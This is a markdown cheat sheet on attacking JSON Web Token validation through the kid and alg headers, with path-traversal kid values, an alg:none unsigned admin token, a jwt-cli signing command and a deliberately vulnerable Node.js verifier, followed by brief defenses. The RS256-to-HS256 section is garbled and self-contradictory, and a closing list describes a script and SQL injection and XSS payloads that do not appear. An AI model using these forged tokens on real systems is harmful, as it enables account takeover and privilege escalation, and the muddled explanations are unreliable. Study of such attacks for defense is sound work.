# 🔐 JWT Header Injection & `kid` Manipulation Exploits

JWT (JSON Web Tokens) are used for stateless authentication. Poor validation of headers like `alg` and `kid` can result in **critical bypasses** and **privilege escalation**.

---

## 🧠 Understanding `kid`

`kid` stands for **Key ID**. It’s used by the server to decide **which key** to use to verify a JWT.

Attackers can **manipulate this value** to:
- Point to arbitrary files
- Force the app to use attacker-controlled keys
- Trigger local file inclusion or path traversal

---

## ☠️ Common Exploits

### 🔸 1. `kid` File Path Injection (LFI or Confusion)

```json
{
  "alg": "HS256",
  "kid": "../../../../../etc/passwd"
}
```
Backend behavior (vulnerable):

```javascript
const keyPath = `keys/${header.kid}`;
const keyContent = fs.readFileSync(keyPath);
const key = fs.readFileSync(`keys/${header.kid}.pem`);
jwt.verify(token, key);
```

🔁 If file content is read as HMAC key — attacker can use predictable file contents as signing material.

🔸 2. Public Key ➝ HMAC Confusion Attack
This is key confusion between asymmetric (RS256) and symmetric (HS256) algorithms.

Steps:
Get server’s public key (via .well-known/jwks.json, etc).
Forge a JWT with the following header:
```json
{
  "alg": "HS256",
  "kid": "<server_public_key>"
}
```
Generate a JWT with the manipulated header.
Send the forged token to the server.
🔁 Server reads the public key from disk (`keys/public.pem`) and tries to verify the token.
🔁 Since the public key is treated as an HMAC secret, it gets hashed before being used.
🔁 The hash matches the expected HMAC digest, so the server accepts the token.
Modify header:

```json
{
  "alg": "HS256",
  "kid": "public.pem"
}
```
Use the public key as the HMAC secret to sign a token.
Send the forged token to the server.
🔁 Server verifies token with public key (asymmetric) but treats it as an HMAC (symmetric) key.
Server accepts it (believing it's valid).
🔁 Server believes the token was signed correctly because it matches the public key.
🔁 The server thinks the token is valid even though it wasn't signed properly.
🔁 This allows attackers to impersonate users or gain unauthorized access.
🧨 Now you're authenticated as any user — including admin.
🔸 3. alg: none Attack
JWT header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
No signature is added. If the server skips validation for alg: none, attacker can forge any payload.
Result: Admin access without knowing the secret or key.

🧪 Example Payloads
1. Unsigned Token (alg: none)
```json
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```
2. Tampered HS256 Token with LFI kid
```json
{
  "alg": "HS256",
  "kid": "../../../dev/null"
}
```
Sign using:
```javascript
// Using jwt-cli tool
jwt encode --alg HS256 --secret "$(cat /dev/null)" '{"user":"admin"}'
```

### 🛡️ Defenses
❌ Do not allow alg: none — ever.

✅ Enforce algorithm types on server (e.g., only RS256).

🧱 Never allow file paths in kid.

🔐 Use robust libraries (PyJWT, jsonwebtoken) with strict settings.

✋ Reject tokens with unknown or untrusted kid.

### 🛠 Tools to Practice

- jwt_tool.py
- AuthAnalyzer
- jwt.io
- Postman with Bearer header injection
- Burp Suite Repeater + Decoder

### 📌 Pro Tip
If the server uses a JWKS endpoint (/.well-known/jwks.json), try:
Swapping in your own public key with matching kid
Attacking the key rotation process
🔴 Impact: Full account takeover, privilege escalation, and unauthenticated admin access.


## What the script now demonstrates:
- ALG=none bypass - Creates unsigned tokens
- KID path traversal - LFI attempts via KID header manipulation
- Malicious KID payloads - SQL injection, XSS, and edge cases
- Token structure analysis - Decoding and header inspection
- Algorithm confusion attacks - RS256→HS256 vulnerability concept
